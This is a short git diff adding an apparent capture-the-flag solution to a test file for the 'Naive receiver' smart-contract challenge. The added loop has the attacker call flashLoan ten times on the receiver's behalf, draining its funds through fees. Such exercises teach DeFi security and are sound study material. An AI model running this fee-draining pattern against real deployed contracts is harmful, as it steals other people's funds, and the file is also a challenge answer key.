@@ -31,6 +31,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        for (var i = 0; i < 10; i++) {
+            let tx = await this.pool.connect(attacker).flashLoan(this.receiver.address, 0);
+            await tx.wait();
+        }
     });
 
     after(async function () {
